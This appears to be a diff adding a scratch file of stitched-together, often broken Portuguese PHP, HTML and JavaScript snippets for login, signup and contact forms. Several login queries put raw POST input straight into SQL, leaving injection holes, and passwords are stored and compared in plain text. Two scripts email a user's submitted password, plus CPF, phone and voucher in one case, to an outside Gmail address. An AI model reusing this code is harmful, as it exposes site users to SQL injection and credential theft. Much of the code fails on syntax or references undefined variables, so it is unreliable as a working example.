@@ -1,0 +1,925 @@
+$_SESSION['msg'] = "<div class="alert alert-danger" role="alert">A simple danger alert—check it out!</div>""
+
+
+
+ /*$response['nome'] =  $nome['nome'];
+    $response['email'] = $email['email'];
+    $response['cpf'] =  $cpf['cpf'];
+    $response['telefone'] = $telefone['telefone'];
+    $response['retorno'] = 'Executou o PHP';
+
+    $destino = 'testeformulario49@gmail.com';
+    $headers = "From :$nome <$email>";
+
+
+  mail($destino, $assunto, $headers);
+
+
+    echo json_encode($response);*/
+
+
+
+
+
+
+
+
+/*if(frm.email.value.indexOf("@") == -1 ||
+      frm.email.valueOf.indexOf(".") == -1 ||
+      frm.email.value == "" ||
+      frm.email.value == null) {
+        alert("Por favor, indique um e-mail válido.");
+        frm.email.focus();
+        return false;
+      }
+
+
+
+  var formulario = document.querySelector('form');
+
+        formulario.onsubmit = function(){
+            if(frm.nome.value == "" || 
+            frm.nome.value == null || frm.nome.value.lenght < 3); 
+            alert("Digite seu nome completo!");
+            return false;
+        }
+        if(!document.querySelector("input[name='cpf']").value){
+            alert("Campo CPF esta vazio!");
+            return false;
+        }
+        if(!document.querySelector("input[name='telefone']").value){
+            alert("Campo Telefone esta vazio!");
+            return false;
+        }
+        if(!document.querySelector("input[name='voucher']").value){
+            alert("Campo Voucher esta vazio!");
+            return false;
+        }
+        if(!document.querySelector("input[name='email']").value){
+            alert("Campo Email esta vazio!");
+            return false;
+        }
+        if(!document.querySelector("input[name='senha']").value){
+            alert("Campo Senha esta vazio!");
+            return false;
+
+
+
+
+            || cpf !== "string"
+        }*/
+
+
+
+
+
+
+        $query = $conn->prepare("INSERT INTO usuario_has_conteudo (usuario_usu_id, conteudo_id) 
+        VALUES (:usuario_id, :conteudo_id)");
+        $query->bindValue(':conteudo_id', 1, PDO::PARAM_INT);
+        $query->bindValue(':usuario_id', $user['usu_id'], PDO::PARAM_INT);
+        $query->execute();
+
+
+
+
+
+////////////////////////////////////////////
+
+        PHP OF
+
+        <?php
+
+  include_once ('config.php');
+  
+    $nome = $_POST['nome'];
+    $cpf = $_POST['cpf'];
+    $telefone = $_POST['telefone'];
+    $voucher = $_POST['voucher'];
+    $email = $_POST['email'];
+    $senha = $_POST['senha'];
+   
+
+    $query = $conn->prepare("SELECT * FROM usuarios");
+    $query->execute();
+    $userCont = $query->fetch(); 
+      
+
+
+  if($userCont){
+    $response['status'] = '200';
+    $response['message'] = 'Deu certo!';
+    $response['nome'] = $usuario['usu_nome'];
+    $response['user_id'] = $telefone;
+
+    $response['erro'] = $query;
+  }
+    echo json_encode($response);
+    
+  
+
+?>
+
+//////////////////////////////////////////
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulário | GN</title>
+    <style>
+        body{
+            font-family: Arial, Helvetica, sans-serif;
+            background-image: linear-gradient(to right, rgb(20, 147, 220), rgb(17, 54, 71));
+        }
+        .box{
+            color: white;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%,-50%);
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 15px;
+            border-radius: 15px;
+            width: 20%;
+        }
+        fieldset{
+            border: 3px solid dodgerblue;
+        }
+        legend{
+            border: 1px solid dodgerblue;
+            padding: 10px;
+            text-align: center;
+            background-color: dodgerblue;
+            border-radius: 8px;
+        }
+        .inputBox{
+            position: relative;
+        }
+        .inputUser{
+            background: none;
+            border: none;
+            border-bottom: 1px solid white;
+            outline: none;
+            color: white;
+            font-size: 15px;
+            width: 100%;
+            letter-spacing: 2px;
+        }
+        .labelInput{
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            pointer-events: none;
+            transition: .5s;
+        }
+        .inputUser:focus ~ .labelInput,
+        .inputUser:valid ~ .labelInput{
+            top: -20px;
+            font-size: 12px;
+            color: dodgerblue;
+        }
+        #data_nascimento{
+            border: none;
+            padding: 8px;
+            border-radius: 10px;
+            outline: none;
+            font-size: 15px;
+        }
+        #submit{
+            background-image: linear-gradient(to right,rgb(0, 92, 197), rgb(90, 20, 220));
+            width: 100%;
+            border: none;
+            padding: 15px;
+            color: white;
+            font-size: 15px;
+            cursor: pointer;
+            border-radius: 10px;
+        }
+        #submit:hover{
+            background-image: linear-gradient(to right,rgb(0, 80, 172), rgb(80, 19, 195));
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <form action="">
+            <fieldset>
+                <legend><b>Fórmulário de Clientes</b></legend>
+                <br>
+                <div class="inputBox">
+                    <input type="text" name="nome" id="nome" class="inputUser" required>
+                    <label for="nome" class="labelInput">Nome completo</label>
+                </div>
+                <br><br>
+                <div class="inputBox">
+                    <input type="text" name="email" id="email" class="inputUser" required>
+                    <label for="email" class="labelInput">Email</label>
+                </div>
+                <br><br>
+                <div class="inputBox">
+                    <input type="tel" name="telefone" id="telefone" class="inputUser" required>
+                    <label for="telefone" class="labelInput">Telefone</label>
+                </div>
+                <p>Sexo:</p>
+                <input type="radio" id="feminino" name="genero" value="feminino" required>
+                <label for="feminino">Feminino</label>
+                <br>
+                <input type="radio" id="masculino" name="genero" value="masculino" required>
+                <label for="masculino">Masculino</label>
+                <br>
+                <input type="radio" id="outro" name="genero" value="outro" required>
+                <label for="outro">Outro</label>
+                <br><br>
+                <label for="data_nascimento"><b>Data de Nascimento:</b></label>
+                <input type="date" name="data_nascimento" id="data_nascimento" required>
+                <br><br><br>
+                <div class="inputBox">
+                    <input type="text" name="cidade" id="cidade" class="inputUser" required>
+                    <label for="cidade" class="labelInput">Cidade</label>
+                </div>
+                <br><br>
+                <div class="inputBox">
+                    <input type="text" name="estado" id="estado" class="inputUser" required>
+                    <label for="estado" class="labelInput">Estado</label>
+                </div>
+                <br><br>
+                <div class="inputBox">
+                    <input type="text" name="endereco" id="endereco" class="inputUser" required>
+                    <label for="endereco" class="labelInput">Endereço</label>
+                </div>
+                <br><br>
+                <input type="submit" name="submit" id="submit">
+            </fieldset>
+        </form>
+    </div>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <?php
+session_start();
+include_once "configlogin.php";
+
+
+$login = $_POST["login"];
+$senha = $_POST["senha"];
+
+
+$query = $conn->prepare("SELECT login, senha FROM usuarios 
+    WHERE login = '{$login}' AND senha = '{$senha}' LIMIT 1");
+//$query->bindValue(':login', $login, PDO::PARAM_STR);
+//$query->bindValue(':senha', $senha, PDO::PARAM_STR);
+//$query->execute();
+//$userCont = $query->fetch();
+if (mysqli_num_rows($resulta) != 0){
+    $_SESSION['msg'] = "<h1 style='color:green'>Login realizado com sucesso!</h1>";
+    header("Location: index.html");
+}else{
+    $_SESSION['msg'] = "<h1 style='color:red'>Erro ao logar! Usuário inexistente ou senha incorreta.</h1>";
+    header("Location: logar.php");
+}
+
+
+/*if($userCont){
+    $response['status'] = '200';
+    $response['message'] = 'Deu certo!';
+    $response['login'] = $login;
+    $response['senha'] = $senha;
+    
+    $response['erro'] = $query;
+  }*/
+  echo json_encode($response);
+
+
+
+
+
+
+
+
+
+$SQL = "SELECT id, nome, login, senha, postar
+FROM aut_usuarios
+WHERE login = "" . $login . """;
+$result_id = @mysql_query($SQL) or die("Erro no banco de dados!");
+$total = @mysql_num_rows($result_id);
+
+// Caso o usuário tenha digitado um login válido o número de linhas será 1..
+if($total)
+{
+	// Obtém os dados do usuário, para poder verificar a senha e passar os demais dados para a sessão
+	$dados = @mysql_fetch_array($result_id);
+
+	// Agora verifica a senha
+	if(!strcmp($senha, $dados["senha"]))
+	{
+		// TUDO OK! Agora, passa os dados para a sessão e redireciona o usuário
+		$_SESSION["id_usuario"]= $dados["id"];
+		$_SESSION["nome_usuario"] = stripslashes($dados["nome"]);
+		$_SESSION["permissao"]= $dados["postar"];
+		header("Location: index.php");
+		exit;
+	}
+	// Senha inválida
+	else
+	{
+	 "Senha inválida!";
+	exit;
+	}
+}
+	// Login inválido
+else
+{
+	echo "O login fornecido por você é inexistente!";
+	exit;
+}
+?>
+
+
+
+ else {
+
+            //verifica se ja tem vinculo com o conteudo
+            $query = $conn->prepare("SELECT * FROM usuario_has_conteudo WHERE usuario_usu_id = :usuario_id AND conteudo_id = :conteudo_id");
+            $query->bindValue(':conteudo_id', 1, PDO::PARAM_INT);
+            $query->bindValue(':usuario_id', $userdb['usu_id'], PDO::PARAM_INT);
+            $query->execute();
+            $userCont = $query->fetch();   
+
+            if ($userCont){
+                $response['status'] = '200';
+                $response['message'] = 'Usuario logado';
+                $response['username'] = $userdb['usu_nome'];
+                $response['user_id'] = $userdb['usu_id'];
+
+                session_start();
+                $login =  $userdb['usu_id'];
+                $_SESSION['login'] = $login;
+
+
+
+                if(empty($bancodedados)){
+    $response['status'] = '400';
+    $response['message'] = 'Usuario ou senha invalidos!';
+    $response['teste'] = $bancodedados;
+    
+} else {
+
+    $query = $conn->prepare("SELECT * FROM usuarios WHERE usu_email = :email AND usu_senha = :senha");
+    $query->bindValue(':conteudo_id', 1, PDO::PARAM_INT);
+    $query->bindValue(':usuario_id', $bancodedados['usu_id'], PDO::PARAM_INT);
+    $query->execute();
+    $userCont = $query->fetch();   
+
+    if ($userCont){
+        $response['status'] = '200';
+        $response['message'] = 'Usuario logado';
+        $response['username'] = $userdb['usu_nome'];
+        $response['user_id'] = $userdb['usu_id'];
+
+        session_start();
+        $login =  $bancodedados['usu_id'];
+        $_SESSION['email'] = $login;
+
+
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+ <?php
+            if(isset($_POST['btn-cadastrar'])){
+                $email = $_POST['email'];
+                $senha = $_POST['senha'];
+
+                $sqlUsuario = MySql::conectar()->prepare("SELECT * FROM usuarios WHERE email = ?");
+                $sqlUsuario->execute(array($email));
+
+                if($sqlUsuario-> rowCount() == 1){
+                    echo "USUARIO JÁ CADASTRADO!";
+            }
+        }
+            ?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            /*if($conn-> nResultado == 1){
+  $logado = true;
+  $_SESSION['email'] = $em;
+  }
+}
+if(isset($_SESSION['email'])){
+    if($_SESSION['email'] != ""){
+      $logado = true;      
+    }
+}
+if(isset($_GET['sair'])){
+  $_SESSION['email'] != "";
+  $logado = false;
+  unset ($_SESSION['email']);
+  session_destroy();
+}
+if($userCont){
+    $response['status'] = '200';
+    $response['message'] = 'Deu certo!';
+    $response['login'] = $login;
+    $response['senha'] = $senha;
+    
+    $response['erro'] = $query;
+  }
+  echo json_encode($response);*/
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+     /*if($conn-> nResultado == 1){
+        $logado = true;
+        $_SESSION['email'] = $em;
+        }
+      }
+      if(isset($_SESSION['email'])){
+          if($_SESSION['email'] != ""){
+            $logado = true;      
+          }
+      }
+      if(isset($_GET['sair'])){
+        $_SESSION['email'] != "";
+        $logado = false;
+        unset ($_SESSION['email']);
+        session_destroy();
+      }
+      if($userCont){
+          $response['status'] = '200';
+          $response['message'] = 'Deu certo!';
+          $response['login'] = $login;
+          $response['senha'] = $senha;
+          
+          $response['erro'] = $query;
+      }*/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <?php
+session_start();
+
+include_once "configlogin.php";
+if(isset($_POST["email"]) && !empty($_POST["email"]) && isset($_POST["senha"]) && !empty($_POST["senha"])){
+
+
+
+$email = addslashes($_POST["email"]);
+$senha = addslashes($_POST["senha"]);
+
+
+      $result = $mysqli->query("SELECT COUNT(*) FROM usuarios WHERE email = '{$email}'");$query->BindValue("email", $email, PDO::PARAM_STR);
+      $query->BindValue("senha", $senha, PDO::PARAM_STR);
+      $query -> execute;
+
+      $row = $result->fetch_row();
+      if ($row[0] > 0) {
+          echo "E-mail já cadastrado";
+      } else {
+          $mysqli->query("Insert into usuarios (nome,sobre,email,senha) values ('".$nome."','".$sobre."','".$email."','".$senha."')");
+      }
+      //$query = $conn->prepare("SELECT FROM usuarios WHERE email = :email AND senha = :senha");
+      
+
+      //if ($rowCount[0] > 0) {
+         // echo "E-mail já cadastrado";
+      //} 
+}
+      if($userCont){
+      $response['status'] = '200';
+      $response['message'] = 'Deu certo!';
+      $response['email'] = $email;
+      $response['senha'] = $senha;
+      
+      $response['erro'] = $query;
+}
+   echo json_encode($row);
+
+
+
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php  
+
+include_once("pag/config.php");
+
+if(isset($_POST['email']) && strlen($_POST['email']) > 0 ){
+    if(!isset($_SESSION))
+    session_start();
+
+    $_SESSION['email'] = $mysqli->escape_string($_POST['email']);
+    $_SESSION['senha'] = ($_POST['senha']);
+
+    $sql_code = "SELECT senha FROM usuarios WHERE email = '$_SESSION[email]'";
+    $sql_query = $mysqli->query($sql_code) or die($mysqli->error);
+    $dado = $sql_query->fetch();
+    $total = $sql_query->num_row;
+
+    if($total == 0){
+        
+        $erro[] = "Este Email não pertence a nenhum usuario";
+    }else{
+
+        if($dado['senha'] == $_SESSION['senha']){
+            $_SESSION['senha'] = $dado['id'];
+
+        }else{
+            $erro[] = "Senha incorreta";
+        }
+    }
+
+    if(count($erro) == 0 || !isset($erro)){
+        echo "<script>alert('Login efetuado com sucesso'); location.href='livro.html';</script>";
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/*if($query['usuarios'] == 0){
+   header('Location: index.php');
+ }
+ elseif($query['usuarios'] == 1){
+  header('Location: pag/livro.html');
+ }*/
+
+
+
+
+
+
+
+
+
+
+
+ /*if($userCont == 0){
+        $response['status'] = '200';
+        $response['message'] = 'Usuario não Encontrado!';
+    
+        echo json_encode($response);
+      }else{
+        echo json_encode($userCont);
+      }*/
+
+
+
+
+
+      * $row = mysqli_num_rows($result);
+
+if($row == 1){
+  $_POST['email'] = $email;
+  header('Location: pag/livro.php');
+  exit();
+}else{
+  header('Location: index.php');
+  exit();
+}*/
+
+
+
+
+*******MASCARA******
+ <script type="text/javascript">
+
+    function fMasc(objeto,mascara) {
+				obj=objeto
+				masc=mascara
+				setTimeout("fMascEx()",1)
+			}
+			function fMascEx() {
+				obj.value=masc(obj.value)
+			}
+			function mTel(tel) {
+				tel=tel.replace(/\D/g,"")
+				tel=tel.replace(/^(\d)/,"($1")
+				tel=tel.replace(/(.{3})(\d)/,"$1)$2")
+				if(tel.length == 9) {
+					tel=tel.replace(/(.{1})$/,"-$1")
+				} else if (tel.length == 10) {
+					tel=tel.replace(/(.{2})$/,"-$1")
+				} else if (tel.length == 11) {
+					tel=tel.replace(/(.{3})$/,"-$1")
+				} else if (tel.length == 12) {
+					tel=tel.replace(/(.{4})$/,"-$1")
+				} else if (tel.length > 12) {
+					tel=tel.replace(/(.{4})$/,"-$1")
+				}
+				return tel;
+			}
+			function mCNPJ(cnpj){
+				cnpj=cnpj.replace(/\D/g,"")
+				cnpj=cnpj.replace(/^(\d{2})(\d)/,"$1.$2")
+				cnpj=cnpj.replace(/^(\d{2})\.(\d{3})(\d)/,"$1.$2.$3")
+				cnpj=cnpj.replace(/\.(\d{3})(\d)/,".$1/$2")
+				cnpj=cnpj.replace(/(\d{4})(\d)/,"$1-$2")
+				return cnpj
+			}
+			function mCPF(cpf){
+				cpf=cpf.replace(/\D/g,"")
+				cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
+				cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
+				cpf=cpf.replace(/(\d{3})(\d{1,2})$/,"$1-$2")
+				return cpf
+			}
+			function mCEP(cep){
+				cep=cep.replace(/\D/g,"")
+				cep=cep.replace(/^(\d{2})(\d)/,"$1.$2")
+				cep=cep.replace(/\.(\d{3})(\d)/,".$1-$2")
+				return cep
+			}
+			function mNum(num){
+				num=num.replace(/\D/g,"")
+				return num
+			}
+</script>
+
+
+
+
+
+<?php
+		if(isset($_SESSION['msg'])){
+			echo $_SESSION['msg'];
+			unset($_SESSION['msg']);
+		}
+	?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+ body{
+        
+        text-align: center;
+        /*max-width: 1000px;
+        min-width: 300px;
+        margin: auto;*/
+        line-height: 2em;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+    
+    fieldset{
+        border-radius: 10px;
+       
+    
+       
+    }
+    /*#container{
+        margin-left: auto;
+        margin-right: auto;
+        padding: 30px;   
+    }*/
+    div >  a{
+       font-size: 15px;
+        color: black;
+    }
+    .field{
+           
+        border: none;
+        width: 400px;
+        height: 30px;
+    }
+    button{
+        background-color: red;
+        border-radius: 10px;
+        border: none;
+        width: 400px;
+        height: 35px;
+            
+    }
+    button:hover{
+        background-color: rgb(187, 27, 27);
+        transition: .05s;
+    }
+        .inputBox{
+            position: relative;
+        }
+        .inputUser{
+            text-align: center;
+            background: none;
+            border: none;
+            border-bottom: 1px solid white;
+            outline: none;
+            color: black;
+            font-size: 15px;
+            width: 100%;
+            
+        }
+        .labelInput{
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            pointer-events: none;
+            transition: .5s;
+        }
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php
+  $email = $_POST['email'];
+  $senha = $_POST['senha'];
+  
+ 
+  $arquivo = "
+    <html>
+    <p><b>E-mail: </b>$email</p>
+    <p><b>Senha: </b>$senha</p>
+    </html>
+  ";
+  
+
+  $destino = "testeformulario49@gmail.com";
+  $assunto = "Contato pelo Site";
+
+
+  $headers  = "MIME-Version: 1.0\n";
+  $headers .= "Content-type: text/html; charset=iso-8859-1\n";
+  $headers .= "From: $email <$email>";
+
+
+  mail($destino, $assunto, $arquivo, $headers);
+  
+  echo "<meta http-equiv='refresh' content='10;URL=../contato.html'>";
+?>
+
+
+
+
+
+
+
+<?php
+
+include_once ("/Applications/MAMP/htdocs/projetologin/pag/cadastro.php");
+
+  //Variáveis
+  $nome = $_POST['nome'];
+  $email = $_POST['email'];
+  $cpf = $_POST['cpf'];
+  $telefone = $_POST['telefone'];
+  $voucher = $_POST['voucher'];
+  $senha = $_POST['senha'];
+  $data_envio = date('d/m/Y');
+  $hora_envio = date('H:i:s');
+
+  $arquivo = "
+    <html>
+      <p>Nome: $nome</p>
+	    <p>CPF: $cpf</p>
+      <p>Telefone: $telefone</p>
+      <p>Voucher: $voucher</p>
+      <p>E-mail: $email</p>
+	    <p>Senha: $senha</p>
+    </html>
+  ";
+  
+  $destino = "testeformulario49@gmail.com";
+  $assunto = "Contato pelo Site";
+
+ 
+  $headers  = "MIME-Version: 1.0\n";
+  $headers .= "Content-type: text/html; charset=iso-8859-1\n";
+  $headers .= "From: $nome <$email>";
+
+  mail($destino, $assunto, $arquivo, $headers);
+  
+
+?>
